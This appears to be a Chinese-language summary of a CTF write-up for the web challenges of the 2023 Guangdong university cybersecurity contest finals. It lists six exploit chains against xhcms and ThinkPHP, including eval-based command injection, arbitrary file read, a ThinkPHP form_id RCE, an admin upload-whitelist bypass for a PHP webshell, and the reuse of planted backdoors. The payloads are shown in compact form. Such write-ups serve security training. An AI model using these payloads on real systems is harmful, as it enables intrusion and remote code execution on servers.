---
title: 第二届广东大学生网络安全攻防大赛决赛WEB_WP
contest: 广东大学生网络安全攻防大赛决赛
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [Web-xhcms,ThinkPHP,mc-core.php,任意文件读取,文件上传,后台上传,RCE,PHP文件包含]
attack_chain: exp_1: POST /, data={1: system('cat /flag')} → 命令注入RCE|exp_2: POST /mc-files/mc-core.php?file=/flag → 任意文件读取|exp_3: POST /index/form/index, form_id=system('cat /flag') → ThinkPHP form_id RCE|exp_4: Login admin/000000/aaaa → /admin/Config 改file_type加php → /admin/Upload/uploadImages.html 上传1.php → /uploads/admin/201910/q.php RCE|exp_5: POST /uploads/admin/201910/this_is_big.php x=cat /flag|exp_6: GET /index/index/shell + Cookie PHPSESSID → /uploads/.bk.php system('cat /flag')
key_payload: data={"1": "system('cat /flag');"}|?file=/flag|form_id="system('cat /flag');"|file_type=gif,png,jpg,jpeg,doc,docx,xls,xlsx,csv,pdf,rar,zip,txt,mp4,flv,php,php5|files={'file': ("1.php", open('q.php', 'rb'), "image/jpeg")}|x=cat /flag|cmd=system('cat /flag');
one_liner: 6道Web题(目录:index.php/mc-admin/mc-files/posts/pages),涵盖xhcms+ThinkPHP+mc-core.php+后台admin/Upload,核心是admin Config改file_type白名单+uploadImages.html上传1.php+JWT验证+后门触发
lesson: 1) xhcms架构识别:mc-files/mc-core.php存在file参数可任意文件读; 2) ThinkPHP form_id直接传system()会被eval触发RCE; 3) 后台上传三件套:Login→Config改file_type(白名单)→Upload/uploadImages.html(WU_FILE_0表单)上传1.php改Content-Type image/jpeg绕; 4) 目录穿越title=../templates/index.html可SSTI; 5) 启动index/index/shell路径生成/.bk.php后门文件→POST cmd=system(); 6) this_is_big.php固定文件名是上一道题留下的后门
quality: medium
---

## 备注

原文(https://www.ctfiot.com/111689.html)给出6个exploit脚本(纯requests,无详细漏洞分析),xhcms架构识别+6种RCE链。

### 目录结构

```
index.php
├─ mc-admin/
│  ├─ conf.php
│  ├─ editor.php
│  ├─ foot.php
│  ├─ head.php
│  ├─ index.php
│  ├─ page-edit.php
│  ├─ page.php
│  ├─ post-edit.php
│  ├─ post.php
│  ├─ style.css
└─ mc-files/
   ├─ markdown.php
   ├─ mc-conf.php
   ├─ mc-core.php
   ├─ mc-rss.php
   ├─ mc-tags.php
   ├─ pages/
   │  ├─ data/
   │  └─ index/
   ├─ posts/
   │  ├─ data/
   │  │  └─ tucvj0.dat
   │  └─ index/
   └─ theme/
      ├─ index.php
      └─ style.css
```

### 6个Exploit详解

1. **exp_1** — POST根,data={'1': 'system(cat /flag)'} → 根index.php直接eval
2. **exp_2** — POST /mc-files/mc-core.php?file=/flag → 任意文件读取flag
3. **exp_3** — POST /index/form/index,form_id=system(cat /flag) → ThinkPHP form_id RCE
4. **exp_4** — Login admin/000000/aaaa → /admin/Config 改file_type加php → /admin/Upload/uploadImages.html 上传1.php(WU_FILE_0+1.jpg)→ 返回path → POST path执行system(cat /flag)
5. **exp_5** — POST /uploads/admin/201910/this_is_big.php x=cat /flag (固定后门)
6. **exp_6** — GET /index/index/shell 触发Cookie+timeout写入/uploads/.bk.php → POST /uploads/.bk.php cmd=system(cat /flag)

## 评级

- **quality: medium** — 6个exp脚本完整可复现,但每个漏洞的具体成因未详细分析,只贴代码
- **vuln_type: web_unknown** — 主分类Web;实际涉及lfi(upload+mc-core)、upload(admin白名单绕)、rce(ThinkPHP+后门)、ssti(模板+config改主题)
- xhcms是常见国产CMS漏洞演练靶场
